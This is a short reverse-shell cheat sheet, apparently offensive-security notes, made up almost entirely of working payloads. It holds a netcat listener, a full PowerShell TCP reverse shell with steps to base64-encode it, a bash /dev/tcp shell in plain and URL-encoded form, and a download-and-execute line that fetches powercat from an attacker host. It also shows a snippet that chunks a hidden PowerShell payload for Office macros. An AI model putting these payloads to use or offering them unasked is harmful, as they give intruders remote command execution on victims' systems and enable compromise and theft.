# Reverse shells

## Listener

```
nc -nvlp PortAtt
```

## Powershell

```
$ pwsh
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("attackerIp",attackerPort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)

cmd> powershell -enc xyz
```

## Bash 

```
bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%22
```

## Powercat - Office

```
IEX(New-Object System.Net.WebClient).DownloadString('http://IpAtt/powercat.ps1');powercat -c IpAtt -p PortAtt -e powershell

str = "powershell.exe -nop -w hidden -e xxxx..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')

cd /usr/share/powershell-empire/empire/server/data/module_source/management
python3 -m http.server 80
```

